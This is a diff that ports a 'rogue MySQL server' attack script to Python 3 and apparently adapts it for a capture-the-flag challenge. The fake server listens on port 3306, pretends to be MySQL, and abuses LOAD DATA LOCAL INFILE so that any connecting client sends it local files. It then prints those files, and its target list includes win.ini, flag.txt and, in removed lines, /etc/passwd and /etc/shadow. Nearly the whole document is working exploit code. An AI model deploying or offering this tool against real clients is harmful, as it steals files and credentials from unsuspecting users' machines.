@@ -1,60 +1,17 @@
 #!/usr/bin/env python
-#coding: utf8
-
-
+# coding: utf8
 import socket
 import asyncore
 import asynchat
 import struct
-import random
-import logging
-import logging.handlers
-
-
+import typing
 
 PORT = 3306
 
-log = logging.getLogger(__name__)
-
-log.setLevel(logging.DEBUG)
-tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
-tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
-log.addHandler(
-    tmp_format
-)
-
-filelist = (
-#    r'c:\boot.ini',
-    r'c:\windows\win.ini',
-#    r'c:\windows\system32\drivers\etc\hosts',
-#    '/etc/passwd',
-#    '/etc/shadow',
-)
-
-
-#================================================
-#=======No need to change after this lines=======
-#================================================
-
-__author__ = 'Gifts'
-
-def daemonize():
-    import os, warnings
-    if os.name != 'posix':
-        warnings.warn('Cant create daemon on non-posix system')
-        return
-
-    if os.fork(): os._exit(0)
-    os.setsid()
-    if os.fork(): os._exit(0)
-    os.umask(0o022)
-    null=os.open('/dev/null', os.O_RDWR)
-    for i in xrange(3):
-        try:
-            os.dup2(null, i)
-        except OSError as e:
-            if e.errno != 9: raise
-    os.close(null)
+FILELIST = [
+    r'c:\flag.txt',
+    r'c:\Windows\win.ini',
+]
 
 
 class LastPacket(Exception):
@@ -68,6 +25,7 @@ class OutOfOrder(Exception):
 class mysql_packet(object):
     packet_header = struct.Struct('<Hbb')
     packet_header_long = struct.Struct('<Hbbb')
+
     def __init__(self, packet_type, payload):
         if isinstance(packet_type, mysql_packet):
             self.packet_num = packet_type.packet_num + 1
@@ -75,36 +33,31 @@ class mysql_packet(object):
             self.packet_num = packet_type
         self.payload = payload
 
-    def __str__(self):
+    def to_bytes(self):
         payload_len = len(self.payload)
         if payload_len < 65536:
             header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
         else:
             header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)
-
-        result = "{0}{1}".format(
-            header,
-            self.payload
-        )
-        return result
+        return header + self.payload
 
     def __repr__(self):
         return repr(str(self))
 
     @staticmethod
     def parse(raw_data):
-        packet_num = ord(raw_data[0])
+        packet_num = raw_data[0]
         payload = raw_data[1:]
 
         return mysql_packet(packet_num, payload)
 
 
 class http_request_handler(asynchat.async_chat):
-
-    def __init__(self, addr):
+    def __init__(self, addr, listener):
         asynchat.async_chat.__init__(self, sock=addr[0])
         self.addr = addr[1]
         self.ibuffer = []
+        self.listener = listener
         self.set_terminator(3)
         self.state = 'LEN'
         self.sub_state = 'Auth'
@@ -112,39 +65,34 @@ class http_request_handler(asynchat.async_chat):
         self.push(
             mysql_packet(
                 0,
-                "".join((
-                    '\x0a',  # Protocol
-                    '3.0.0-Evil_Mysql_Server' + '\0',  # Version
-                    #'5.1.66-0+squeeze1' + '\0',
-                    '\x36\x00\x00\x00',  # Thread ID
-                    'evilsalt' + '\0',  # Salt
-                    '\xdf\xf7',  # Capabilities
-                    '\x08',  # Collation
-                    '\x02\x00',  # Server Status
-                    '\0' * 13,  # Unknown
-                    'evil2222' + '\0',
-                ))
-            )
+                b'\x0a'
+                b'5.6.28-0ubuntu0.14.04.1'
+                b'\0'
+                b'\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00'
+                b'\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71'
+                b'\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00')
         )
 
         self.order = 1
         self.states = ['LOGIN', 'CAPS', 'ANY']
 
-    def push(self, data):
-        log.debug('Pushed: %r', data)
-        data = str(data)
+    def push(self, data: typing.Optional[mysql_packet]):
+        if isinstance(data, mysql_packet):
+            data = data.to_bytes()
+        if data is None:
+            data = b''
+            self.listener.finished()
         asynchat.async_chat.push(self, data)
 
     def collect_incoming_data(self, data):
-        log.debug('Data recved: %r', data)
         self.ibuffer.append(data)
 
     def found_terminator(self):
-        data = "".join(self.ibuffer)
+        data = b''.join(self.ibuffer)
         self.ibuffer = []
 
         if self.state == 'LEN':
-            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
+            len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1
             if len_bytes < 65536:
                 self.set_terminator(len_bytes)
                 self.state = 'Data'
@@ -165,78 +113,71 @@ class http_request_handler(asynchat.async_chat):
                     # Fix ?
                     self.order = packet.packet_num + 2
                 if packet.packet_num == 0:
-                    if packet.payload[0] == '\x03':
-                        log.info('Query')
-
-                        filename = random.choice(filelist)
-                        PACKET = mysql_packet(
-                            packet,
-                            '\xFB{0}'.format(filename)
-                        )
+                    if packet.payload[0] == 0x3:
+                        filename = self.listener.next_filename()
+                        packet = mysql_packet(packet, b'\xFB' + filename.encode('utf-8'))
+                        self.push(packet)
                         self.set_terminator(3)
                         self.state = 'LEN'
                         self.sub_state = 'File'
-                        self.push(PACKET)
-                    elif packet.payload[0] == '\x1b':
-                        log.info('SelectDB')
-                        self.push(mysql_packet(
-                            packet,
-                            '\xfe\x00\x00\x02\x00'
-                        ))
+
+                    elif packet.payload[0] == 0x1b:
+                        self.push(mysql_packet(packet, b'\xfe\x00\x00\x02\x00'))
                         raise LastPacket()
-                    elif packet.payload[0] in '\x02':
-                        self.push(mysql_packet(
-                            packet, '\0\0\0\x02\0\0\0'
-                        ))
+                    elif packet.payload[0] == 0x02:
+                        self.push(mysql_packet(packet, b'\0\0\0\x02\0\0\0'))
                         raise LastPacket()
-                    elif packet.payload == '\x00\x01':
+                    elif packet.payload == b'\x00\x01':
                         self.push(None)
                         self.close_when_done()
                     else:
-                        raise ValueError()
+                        pass
+                        # raise ValueError()
                 else:
                     if self.sub_state == 'File':
-                        log.info('-- result')
-                        log.info('Result: %r', data)
-
                         if len(data) == 1:
-                            self.push(
-                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
-                            )
+                            self.push(mysql_packet(packet, b'\0\0\0\x02\0\0\0'))
                             raise LastPacket()
                         else:
+                            print('[+] Filename :', self.listener.current_filename)
+                            result = data[1:]
+                            try:
+                                result = result.decode('utf8')
+                            except UnicodeDecodeError:
+                                try:
+                                    result = result.decode('gbk')
+                                except UnicodeDecodeError as e:
+                                    print('[-] Warning:', e)
+                                pass
+                            print('[+] Content:')
+                            print(result)
                             self.set_terminator(3)
                             self.state = 'LEN'
                             self.order = packet.packet_num + 1
 
                     elif self.sub_state == 'Auth':
-                        self.push(mysql_packet(
-                            packet, '\0\0\0\x02\0\0\0'
-                        ))
+                        self.push(mysql_packet(packet, b'\0\0\0\x02\0\0\0'))
                         raise LastPacket()
                     else:
-                        log.info('-- else')
                         raise ValueError('Unknown packet')
             except LastPacket:
-                log.info('Last packet')
                 self.state = 'LEN'
                 self.sub_state = None
                 self.order = 0
                 self.set_terminator(3)
             except OutOfOrder:
-                log.warning('Out of order')
                 self.push(None)
                 self.close_when_done()
         else:
-            log.error('Unknown state')
-            self.push('None')
+            self.push(None)
             self.close_when_done()
 
 
 class mysql_listener(asyncore.dispatcher):
     def __init__(self, sock=None):
         asyncore.dispatcher.__init__(self, sock)
-
+        self.filename_cursor = 0
+        self.current_filename = ''
         if not sock:
             self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
             self.set_reuse_addr()
@@ -247,14 +188,23 @@ class mysql_listener(asyncore.dispatcher):
 
             self.listen(5)
 
+    def next_filename(self):
+        if self.filename_cursor >= len(FILELIST):
+            self.filename_cursor = 0
+        filename = FILELIST[self.filename_cursor]
+        self.filename_cursor += 1
+        self.current_filename = filename
+        return filename
+
     def handle_accept(self):
         pair = self.accept()
-
         if pair is not None:
-            log.info('Conn from: %r', pair[1])
-            tmp = http_request_handler(pair)
+            http_request_handler(pair, self)
 
 
-z = mysql_listener()
-daemonize()
-asyncore.loop()
+if __name__ == '__main__':
+    if len(FILELIST) == 0:
+        print('[-] Filelist is empty!')
+        exit(0)
+    mysql_listener()
+    asyncore.loop(1)
